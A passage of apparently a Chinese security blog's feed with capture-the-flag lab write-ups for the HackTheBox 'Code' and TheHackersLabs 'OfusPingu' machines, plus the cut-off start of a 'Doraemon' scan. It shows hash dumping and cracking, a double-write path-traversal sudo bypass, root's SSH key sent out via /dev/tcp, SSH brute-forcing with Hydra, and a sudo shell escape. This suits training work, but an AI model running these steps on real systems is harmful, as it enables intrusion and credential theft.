'code=print(render_template_string(\"{{*}}\"))'\n```\n\n结果就是没办法利用，但是知道了存在`jinja2`\n\n![image.png](/post-images/HackTheBoxSeason7-Code/image61.png)\n\n因为存在登陆操作，所以可能可以进行操作数据库，尝试一下数据库语法\n\n![image.png](/post-images/HackTheBoxSeason7-Code/image62.png)\n\n有回显，通过`GPT`进行构造\n\n```bash\ncode=print([user.username for user in User.query.all()])\n// output\n{\"output\":\"['development', 'martin', 'test']\\n\"}\n```\n\n```bash\n\ncode=print([user.password for user in User.query.all()])\n// output\n{\"output\":\"['759b74ce43947f5f4c91aeddc3e5bad3', '3de6f30c4a09c27fc71932bfc68474be', '098f6bcd4621d373cade4e832627b4f6']\\n\"}\n```\n\n得到两组用户名密码`development:759b74ce43947f5f4c91aeddc3e5bad3` 和`martin:3de6f30c4a09c27fc71932bfc68474be`\n\n将密码保存到`pass.txt`使用`John`破解\n\n```bash\n⚡ root@kali  ~/Desktop/test/Code  john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 pass.txt\nUsing default input encoding: UTF-8\nLoaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support for this hash type, consider --fork=16\nPress 'q' or Ctrl-C to abort, almost any other key for status\ndevelopment      (?)     \nnafeelswordsmaster (?)     \n2g 0:00:00:00 DONE (2025-03-25 00:26) 3.333g/s 8711Kp/s 8711Kc/s 9050KC/s nafi79..naerulz\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed. \n```\n\n```bash\ndevelopment:development\nmartin:nafeelswordsmaster\n```\n\n得到两个账户，直接尝试`SSH` \n\n最后使用`martin`成功登录\n\n```bash\n⚡ root@kali  ~/Desktop/test/Code  ssh martin@10.10.11.62\nmartin@10.10.11.62's password: \nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information as of Tue 25 Mar 2025 04:10:56 AM UTC\n\n  System load:           0.3\n  Usage of /:            51.4% of 5.33GB\n  Memory usage:          14%\n  Swap usage:            0%\n  Processes:             234\n  Users logged in:       1\n  IPv4 address for eth0: 10.10.11.62\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:c80e\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nLast login: Tue Mar 25 04:10:56 2025 from 10.10.16.7\nmartin@code:~$ \n```\n\n## Get Flag\n\n信息收集一波\n\n```bash\nmartin@code:~$ uname -a\nLinux code 5.4.0-208-generic #228-Ubuntu SMP Fri Feb 7 19:41:33 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux\n```\n\n```bash\nmartin@code:~$ ip add\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:50:56:b9:c8:0e brd ff:ff:ff:ff:ff:ff\n    inet 10.10.11.62/23 brd 10.10.11.255 scope global eth0\n       valid_lft forever preferred_lft forever\n    inet6 dead:beef::250:56ff:feb9:c80e/64 scope global dynamic mngtmpaddr \n       valid_lft 86399sec preferred_lft 14399sec\n    inet6 fe80::250:56ff:feb9:c80e/64 scope link \n       valid_lft forever preferred_lft forever\n```\n\n```bash\nmartin@code:~$ sudo -l\nMatching Defaults entries for martin on localhost:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser martin may run the following commands on localhost:\n    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh\n```\n\n查看一下我们可以以`Root`权限运行的脚本\n\n```bash\nmartin@code:~/backups/home/app-production/app$ cat /usr/bin/backy.sh\n#!/bin/bash\n\nif [[ $# -ne 1 ]]; then\n    /usr/bin/echo \"Usage: $0 <task.json>\"\n    exit 1\nfi\n\njson_file=\"$1\"\n\nif [[ ! -f \"$json_file\" ]]; then\n    /usr/bin/echo \"Error: File '$json_file' not found.\"\n    exit 1\nfi\n\nallowed_paths=(\"/var/\" \"/home/\")\n\nupdated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub(\"\\\\.\\\\./\"; \"\"))' \"$json_file\")\n\n/usr/bin/echo \"$updated_json\" > \"$json_file\"\n\ndirectories_to_archive=$(/usr/bin/echo \"$updated_json\" | /usr/bin/jq -r '.directories_to_archive[]')\n\nis_allowed_path() {\n    local path=\"$1\"\n    for allowed_path in \"${allowed_paths[@]}\"; do\n        if [[ \"$path\" == $allowed_path* ]]; then\n            return 0\n        fi\n    done\n    return 1\n}\n\nfor dir in $directories_to_archive; do\n    if ! is_allowed_path \"$dir\"; then\n        /usr/bin/echo \"Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed.\"\n        exit 1\n    fi\ndone\n\n/usr/bin/backy \"$json_file\"\n```\n\n脚本接收`task.json` ，读取 `directories_to_archive` 字段的目录列表，只允许 `/var/` 和 `/home/` 目录下的路径，其他路径会触发错误并退出\n\n尝试构造`Json`文件`task.json`\n\n```bash\n{\n\t\"directories_to_archive\":[\n\t\t\"/home/app-production/\"\n\t]\n}\n// run\nmartin@code:~$ sudo /usr/bin/backy.sh task.json \n2025/03/25 06:38:38 🍀 backy 1.2\n2025/03/25 06:38:38 📋 Working with task.json ...\n2025/03/25 06:38:38 🔰 Task configuration: destination must be specified!\n2025/03/25 06:38:38 ❗ Can't read provided task configuration\n```\n\n缺少`desination`参数，应该是保存到哪的参数\n\n```bash\n{\n\t\"directories_to_archive\":[\n\t\t\"/home/app-production/\"\n\t],\n\t\"destination\":\"/home/martin\"\n}\n// run\nmartin@code:~$ sudo /usr/bin/backy.sh task.json \n2025/03/25 06:41:28 🍀 backy 1.2\n2025/03/25 06:41:28 📋 Working with task.json ...\n2025/03/25 06:41:28 💤 Nothing to sync\n2025/03/25 06:41:28 📤 Archiving: [/home/app-production]\n2025/03/25 06:41:28 📥 To: /home/martin ...\n2025/03/25 06:41:28 📦\n```\n\n执行完成后多出来一个压缩包\n\n```bash\nmartin@code:~$ ls\nbackups  code_home_app-production_2025_March.tar.bz2  task.json\n```\n\n对其进行解压，解压完毕后可以发现是用户`app-production` 的家目录，并且存在`user.txt`\n\n```bash\nmartin@code:~/home/app-production$ cat user.txt \n4332e6b51ad86bfd87072af615996ff1\n```\n\n再构造读取`root`的家目录\n\n```bash\n{\n\t\"directories_to_archive\":[\n\t\t\"/home/../root/\"\n\t],\n\t\"destination\":\"/home/martin\"\n}\n// run\nmartin@code:~$ sudo /usr/bin/backy.sh task.json \n2025/03/25 06:46:56 🍀 backy 1.2\n2025/03/25 06:46:56 📋 Working with task.json ...\n2025/03/25 06:46:56 💤 Nothing to sync\n2025/03/25 06:46:56 📤 Archiving: [/home/root]\n2025/03/25 06:46:56 📥 To: /home/martin ...\n2025/03/25 06:46:56 📦\n2025/03/25 06:46:56 💢 Archiving failed for: /home/root\n2025/03/25 06:46:56 ❗ Archiving completed with errors\n```\n\n构造双写绕过\n\n```bash\n{\n\t\"directories_to_archive\":[\n\t\t\"/home/....//root/\"\n\t],\n\t\"destination\":\"/home/martin\"\n}\n// run\nrtin@code:~$ sudo /usr/bin/backy.sh task.json \n2025/03/25 06:49:24 🍀 backy 1.2\n2025/03/25 06:49:24 📋 Working with task.json ...\n2025/03/25 06:49:24 💤 Nothing to sync\n2025/03/25 06:49:24 📤 Archiving: [/home/../root]\n2025/03/25 06:49:24 📥 To: /home/martin ...\n2025/03/25 06:49:24 📦\n```\n\n成功，读取root.txt\n\n```bash\nmartin@code:~/root$ cat root.txt \n372cf788ca3e30b86c01d19cb8bac1d9\n```\n\n## Get Root Shell\n\n解压问就按后看到存在`.ssh`文件夹，并且存在私钥`id_rsa`\n\n转储私钥到攻击机\n\n```bash\n// Kali\n**nc -lvp 1234 > sshkey**\n// Code\n**martin@code:~/root/.ssh$ cat id_rsa > /dev/tcp/10.10.16.7/1234**\n```\n\n![image.png](/post-images/HackTheBoxSeason7-Code/image63.png)\n\n修改权限为`600` ，并使用私钥进行登录\n\n```bash\n⚡ root@kali  ~/Desktop/test/Code  chmod 600 sshkey                      \n⚡ root@kali  ~/Desktop/test/Code  ssh root@10.10.11.62 -i sshkey          \nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)     \n                                                                              \n * Documentation:  https://help.ubuntu.com                                    \n * Management:     https://landscape.canonical.com                            \n * Support:        https://ubuntu.com/pro                                     \n                                                                              \n System information as of Tue 25 Mar 2025 07:10:19 AM UTC                     \n                                                                              \n  System load:           0.0                                                  \n  Usage of /:            51.3% of 5.33GB                                      \n  Memory usage:          13%                                                  \n  Swap usage:            0%                                                   \n  Processes:             236                                                  \n  Users logged in:       1                                                    \n  IPv4 address for eth0: 10.10.11.62                                          \n  IPv6 address for eth0: dead:beef::250:56ff:feb9:4461                        \n                                                                              \n                                                                              \nExpanded Security Maintenance for Applications is not enabled.                \n                                                                              \n0 updates can be applied immediately.                                         \n                                                                              \nEnable ESM Apps to receive additional future security updates.                \nSee https://ubuntu.com/esm or run: sudo pro status                            \n                                       \nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings \n                                                                              \n                                                                              \nLast login: Tue Mar 25 07:10:19 2025 from 10.10.16.7                          \nroot@code:~#                           \n```\n",
            "url": "https://www.sunsetaction.top/2025/08/06/HackTheBoxSeason7-Code",
            "title": "HackTheBox - Machine - Code",
            "summary": "Season7 Code https://app.hackthebox.com/machines/653 | esay 前期踩点 就扫描出一个22端口，不对劲继续扫 新端口是一个代码编辑器Python Code Editor WEB 渗透 可以执行python命令，首先尝试一下os 库 提示Use ...",
            "date_modified": "2025-04-04T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HackTheBox",
                "Linux靶机"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/05/TheHackersLabsOfusPingu",
            "content_html": "\n# OfusPingu\n\n> https://labs.thehackerslabs.com/machine/102\n> \n\n![image.png](/post-images/TheHackersLabsOfusPingu/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\n➜  OfusPingu nmap -sn 192.168.56.0/24                      \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:31 CST\nNmap scan report for 192.168.56.1\nHost is up (0.00042s latency).\nMAC Address: 0A:00:27:00:00:08 (Unknown)\nNmap scan report for 192.168.56.2\nHost is up (0.00022s latency).\nMAC Address: 08:00:27:45:5E:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.103\nHost is up (0.00040s latency).\nMAC Address: 08:00:27:95:98:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.5\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 27.97 seconds\n```\n\n```bash\n➜  OfusPingu nmap -sT -min-rate 10000 -p- 192.168.56.103\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:34 CST\nNmap scan report for 192.168.56.103\nHost is up (0.00056s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3000/tcp open  ppp\nMAC Address: 08:00:27:95:98:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 17.01 seconds\n```\n\n```bash\n➜  OfusPingu nmap -sT -A -p 22,80,3000 192.168.56.103    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:36 CST\nNmap scan report for 192.168.56.103\nHost is up (0.00056s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n| ssh-hostkey: \n|   256 5c:08:d0:7c:02:65:4d:8b:95:7b:a2:89:af:ab:fc:9c (ECDSA)\n|_  256 af:ff:d1:1b:e2:5a:32:cb:23:47:71:2d:7a:2c:93:2e (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: Ofuscaci\\xC3\\xB3n de C\\xC3\\xB3digo JavaScript | Seguridad en APIs\n|_http-server-header: Apache/2.4.62 (Debian)\n3000/tcp open  http    Node.js Express framework\n|_http-title: Error\nMAC Address: 08:00:27:95:98:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.56 ms 192.168.56.103\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 26.49 seconds\n```\n\n### 枚举\n\n`HTTP` 80 端口\n\n![image.png](/post-images/TheHackersLabsOfusPingu/image1.png)\n\n目录扫描\n\n```bash\n➜  OfusPingu feroxbuster --url http://192.168.56.103 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400 -x js,txt,zip,php\n  \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://192.168.56.103\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503, 400]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ true\n 💲  Extensions            │ [js, txt, zip, php]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET        1l       23w     1492c http://192.168.56.103/script.js\n200      GET      422l     1343w    17244c http://192.168.56.103/\n[####################] - 2m   1102740/1102740 0s      found:2       errors:965    \n[####################] - 2m   1102725/1102725 8759/s  http://192.168.56.103/\n```\n\n`script.js` 很明显就是被混淆过了\n\n![image.png](/post-images/TheHackersLabsOfusPingu/image2.png)\n\n通过 `AI` 进行恢复\n\n```bash\n// =======================================================\n//               【还原后的可读代码】\n// =======================================================\n\n// 函数：初始化应用程序\nfunction inicializarAplicacion() {\n    // 这个 'configParts' 变量在这段代码中并未定义，\n    // 它很可能是在此脚本加载之前的某个地方定义的全局变量。\n    // 假设 configParts = ['QWERTY', 'CHOCOLATITO', 'CHOCOLATON', 'CHINGON']\n    const API_KEY_SECRETA = configParts.map(f => f.toLowerCase()).join(''); \n    // 结果会是 'qwertychocolatitocholatonchingon'\n\n    // 应用的配置对象\n    const appConfig = {\n        version: '1.0.3',\n        entorno: 'produccion', // 环境：生产\n        apiEndpoint: 'https://adivinaadivinanza/v3', // API 地址\n        credenciales: {\n            usuario: 'jeje',\n            // 通过一系列字符串操作生成访问凭证\n            acceso: API_KEY_SECRETA.split('').reverse().join('') + '123'.split('').reverse().join('')\n            // 'qwertychocolatitocholatonchingon' -> 反转 -> 'nognihcnotalocotihtalocohcytrewq'\n            // '123' -> 反转 -> '321'\n            // 最终的 acceso 是 'nognihcnotalocotihtalocohcytrewq321'\n        },\n        features: {\n            darkMode: true,\n            analytics: false\n        }\n    };\n\n    // 函数：连接API\n    const conectarAPI = () => {\n        // 对 'acceso' 凭证再次进行处理，生成最终的密钥\n        const claveFinal = appConfig.credenciales.acceso.slice(0, -3).split('').reverse().join('');\n        // 1. 去掉最后3个字符 ('321') -> 'nognihcnotalocotihtalocohcytrewq'\n        // 2. 再次反转 -> 'qwertychocolatitocholatonchingon' (恢复原样)\n\n        console.log('Conectando la API con clave:', claveFinal); // \"连接 API，使用密钥: qwertychocolatitocholatonchingon\"\n        \n        // 返回一个模拟的API连接成功对象\n        return {\n            status: 200,\n            message: 'Conexión exitosa', // \"连接成功\"\n            // 将 '密钥:admin' 进行 Base64 编码作为 token\n            token: btoa(claveFinal + ':' + 'admin') \n        };\n    };\n\n    // **关键逻辑**：只有当网页的域名是 'secretazosecreton' 时，才执行连接API的操作\n    if (window.location.hostname === 'secretazosecreton') {\n        // 3秒后执行\n        setTimeout(() => {\n            const m = conectarAPI();\n            console.log('Resultado conexión:', m); // \"连接结果: ...\"\n        }, 3000);\n    }\n}\n\n// 当整个页面的HTML加载和解析完成后，执行以下代码\ndocument.addEventListener('DOMContentLoaded', () => {\n    // 1. 初始化应用\n    inicializarAplicacion();\n    \n    // 2. 给页面上所有的 <button> 元素添加点击事件监听\n    const buttons = document.querySelectorAll('button');\n    buttons.forEach(btn => {\n        btn.addEventListener('click', () => {\n            console.log('Botón clickeado'); // \"按钮被点击了\"\n        });\n    });\n});\n\n// 函数：验证密钥\nfunction validarClave(a) {\n    const claveReal = 'QWERTYCHOCOLATITOCHOCOLATONCHINGON';\n    return a === claveReal;\n}\n\n// 这是一个模块导出语句，常见于 Node.js 环境。\n// 意思是如果这个JS文件在支持模块化的环境（如Node.js）中被引用，\n// 它会导出一个包含 validarClave 函数的对象。\nif (typeof module !== 'undefined' && module.exports) {\n    module.exports = {\n        validarClave\n    };\n}\n```\n\n得到一些信息，例如秘钥：`QWERTYCHOCOLATITOCHOCOLATONCHINGON`\n\n接下来到 `3000`端口\n\n![image.png](/post-images/TheHackersLabsOfusPingu/image3.png)\n\n对 `3000` 端口进行 `fuzz` \n\n```bash\n➜  OfusPingu wfuzz -u 'http://192.168.56.103:3000/FUZZ' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt --hc 404\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.56.103:3000/FUZZ\nTotal requests: 74332\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                                        \n=====================================================================\n\n000000823:   400        0 L      2 W        33 Ch       \"api\"                                                                                                                          \n000016154:   301        10 L     15 W       156 Ch      \"public\"                                                                                                                       \n000016155:   301        10 L     15 W       156 Ch      \"Public\"                                                                                                                       \n000022384:   400        0 L      2 W        21 Ch       \"view\"                                                                                                                         \n\nTotal time: 88.55361\nProcessed Requests: 74332\nFiltered Requests: 74328\nRequests/sec.: 839.4010\n```\n\n`api` 直接访问提示\n\n```bash\n{\"error\":\"Parámetro incorrecto.\"}\n```\n\n`view` 直接访问提示\n\n```bash\nParámetro incorrecto.\n```\n\n在对其进行枚举，使用上边的秘钥作为参数\n\n```bash\n➜  OfusPingu wfuzz -u 'http://192.168.56.103:3000/api/?FUZZ=QWERTYCHOCOLATITOCHOCOLATONCHINGON' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt --hc=404,400\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.56.103:3000/api/?FUZZ=QWERTYCHOCOLATITOCHOCOLATONCHINGON\nTotal requests: 74332\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                                        \n=====================================================================\n\n000020620:   200        0 L      1 W        30 Ch       \"token\"  \n```\n\n枚举出来 `token`\n\n```bash\n➜  OfusPingu curl http://192.168.56.103:3000/api/\\?token\\=QWERTYCHOCOLATITOCHOCOLATONCHINGON                                                                     \n{\"key\":\"MI-KEY-SECRETA-12345\"}# \n```\n\n得到一个 `key`\n\n我们再测试 `view`\n\n```bash\n➜  OfusPingu curl http://192.168.56.103:3000/view/\\?token\\=QWERTYCHOCOLATITOCHOCOLATONCHINGON\nParámetro incorrecto.#\n\n➜  OfusPingu curl http://192.168.56.103:3000/view/\\?token\\=MI-KEY-SECRETA-12345\nParámetro incorrecto.#\n\n➜  OfusPingu curl http://192.168.56.103:3000/view/\\?key\\='MI-KEY-SECRETA-12345'                  \n<!DOCTYPE html>        \n<html lang=\"es\">                                                                                \n<head>                                                                                          \n  <meta charset=\"UTF-8\">                        \n  <title>Zona Secreta</title\n  ...\n```\n\n告诉我们可以使用密码和 `debian` 进行 `ssh` 登录\n\n![image.png](/post-images/TheHackersLabsOfusPingu/image4.png)\n\n使用 `hydra` 进行爆破\n\n```bash\n➜  OfusPingu hydra -l debian -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.103 ssh                                                                                                       \nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-05 19:53:26\n[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task\n[DATA] attacking ssh://192.168.56.103:22/\n[22][ssh] host: 192.168.56.103   login: debian   password: chocolate\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-05 19:53:41\n```\n\n进入后能读到 `user.txt`\n\n```bash\ndebian@OfusPingu:~$ cat flag.txt \n457xxxxxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## 权限提升\n\n`.bash_history` 没删掉，但是内容貌似没有很有用\n\n```bash\ndebian@OfusPingu:~$ ls -la\ntotal 36\ndrwx------ 4 debian debian 4096 Jun  7 12:09 .\ndrwxr-xr-x 3 root   root   4096 Jun  7 10:52 ..\n-rw------- 1 debian debian  387 Jun  7 12:16 .bash_history\n-rw-r--r-- 1 debian debian  220 Jun  7 10:52 .bash_logout\n-rw-r--r-- 1 debian debian 3526 Jun  7 10:52 .bashrc\n-rw-r--r-- 1 root   root     33 Jun  7 12:09 flag.txt\ndrwxr-xr-x 3 debian debian 4096 Jun  7 12:05 .local\ndrwxr-xr-x 4 root   root   4096 Jun  7 17:03 mi-web\n-rw-r--r-- 1 debian debian  807 Jun  7 10:52 .profile\n\ndebian@OfusPingu:~$ cat .bash_history \nsudo -l\nsudo /usr/bin/rename\nsudo /usr/bin/rename -h\nsudo /usr/bin/rename -m\nexit\nls\ncd mi-web/\nls\npwd\nsudo su\nsudo -l\nsudo /usr/bin/rename\nsudo /usr/bin/rename -m\ngrub-mkpasswd-pbkdf2\ntouch /etc/grub.d/01_password && chmod a+x /etc/grub.d/01_password\nnano /etc/grub.d/01_password\nsudo nano /etc/grub.d/01_password\nsudo su\nsudo -l\nsudo /usr/bin/rename -m\nsudo -l\nsudo /usr/bin/rename -m\n```\n\n查看 `sudo` 权限\n\n```bash\ndebian@OfusPingu:~$ sudo -l\nMatching Defaults entries for debian on OfusPingu:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser debian may run the following commands on OfusPingu:\n    (ALL) NOPASSWD: /usr/bin/rename\n```\n\n结束了，跟着`.bash_history` 敲 `sudo /usr/bin/rename -m` 会进入帮助\n\n![image.png](/post-images/TheHackersLabsOfusPingu/image5.png)\n\n然后可以输入`esc` + `!/bin/bash` 即可切换到 `root shell` ，这里类似于使用 `less` 或者 `more`等来提权\n\n![image.png](/post-images/TheHackersLabsOfusPingu/image6.png)\n\n读取 `root.txt`\n\n```bash\nroot@OfusPingu:~# cat root.txt \nD99xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n```",
            "url": "https://www.sunsetaction.top/2025/08/05/TheHackersLabsOfusPingu",
            "title": "TheHackersLabs - OfusPingu",
            "summary": "OfusPingu https://labs.thehackerslabs.com/machine/102 Recon PortScan 枚举 HTTP 80 端口 目录扫描 script.js 很明显就是被混淆过了 通过 AI 进行恢复 得到一些信息，例如秘钥：QWERTYCHOCOLATITOC...",
            "date_modified": "2025-08-05T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Linux",
                "API",
                "rename",
                "hydra"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/03/TheHackersLabsDoraemon",
            "content_html": "\n# Doraemon\n\n> https://labs.thehackerslabs.com/machine/30\n> \n\n![image.png](/post-images/TheHackersLabsDoraemon/image.png)\n\n## Recon\n\n### PortScan\n\n```scheme\n➜  Doraemon nmap -sn 192.168.10.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:52 CST\nNmap scan report for 192.168.10.1\nHost is up (0.00057s latency).\nMAC Address: 0A:00:27:00:00:10 (Unknown)\nNmap scan report for 192.168.10.5\nHost is up (0.00081s latency).\nMAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.10.7\nHost is up (0.00050s latency).\nMAC Address: 08:00:27:34:2C:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.10.100\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 2.26 seconds\n```\n\n```scheme\n➜  Doraemon nmap -sT -min-rate 10000 -p- 192.168.10.5\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:53 CST\nWarning: 192.168.10.5 giving up on port because retransmission cap hit (10).\nNmap scan report for 192.168.10.5\nHost is up (0.00038s latency).\nNot shown: 64597 closed tcp ports (conn-refused), 913 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n49671/tcp open  unknown\n49673/tcp open  unknown\n49676/tcp open  unknown\n49687/tcp open  unknown\n49705/tcp open  unknown\nMAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n```scheme\n➜  Doraemon nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.5\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:53 CST\nNmap scan report for 192.168.10.5\nHost is up (0.00049s latency).\n\nPORT      STATE SERVICE      VERSION\n53/tcp    open  domain       Simple DNS Plus\n88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-08-03 08:53:47Z)\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: DORAEMON.THL, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: DORAEMON)\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: DORAEMON.THL, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf       .NET Message Framing\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nMAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice 